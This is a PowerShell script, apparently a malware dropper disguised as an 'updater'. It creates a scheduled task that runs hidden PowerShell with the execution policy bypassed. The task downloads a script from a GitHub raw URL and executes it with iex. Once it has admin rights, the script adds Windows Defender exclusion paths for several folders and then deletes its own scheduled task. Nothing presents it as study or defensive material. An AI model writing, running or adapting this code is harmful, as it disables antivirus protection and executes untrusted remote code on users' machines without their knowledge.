# =============================
# PowerShell Boot-Safe Exclusion Script with UAC Trigger
# =============================

$logPath = "C:\Windows\Temp\updater_log.txt"

function Write-Log {
    param ($msg)
    $timestamp = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    $timestamp | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Write basic info
Write-Log "Script executed by user: $env:USERNAME"

# Check if running interactively and as administrator
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
$isInteractive = ([Environment]::UserInteractive)

if (-not $isAdmin -or -not $isInteractive) {
    Write-Log "⏳ Not in interactive user context or not admin. Deferring to scheduled task..."

    # Prepare a scheduled task to run this script with admin rights and UAC
    $taskName = "UpdaterUACTrigger"
    $taskScript = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex\""

    # Clean any previous task
    schtasks.exe /Delete /TN $taskName /F 2>$null | Out-Null

    # Create new task to run after 1 minute
    $time = (Get-Date).AddMinutes(1).ToString("HH:mm")
    schtasks.exe /Create /TN $taskName /TR "$taskScript" /SC ONCE /ST $time /RL HIGHEST /F | Out-Null

    Write-Log "✅ Scheduled task '$taskName' created."
    exit
}

Write-Log "Running as admin. Attempting to add exclusions..."

$foldersToEnsure = @(
    "$env:USERPROFILE\TestSafeFolder",
    "C:\TestFolder1",
    "C:\TestFolder2"
)

foreach ($folder in $foldersToEnsure) {
    try {
        if (-not (Test-Path $folder)) {
            New-Item -ItemType Directory -Path $folder -Force | Out-Null
        }
        Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
        Write-Log "✅ Added exclusion: $folder"
    }
    catch {
        Write-Log "❌ Failed to add exclusion: $folder. Error: $_"
    }
}

# Clean up the task if it exists
$taskName = "UpdaterUACTrigger"
schtasks.exe /Delete /TN $taskName /F 2>$null | Out-Null
Write-Log "🧹 Deleted scheduled task: $taskName (if it existed)"

Write-Log "✅ Script completed."
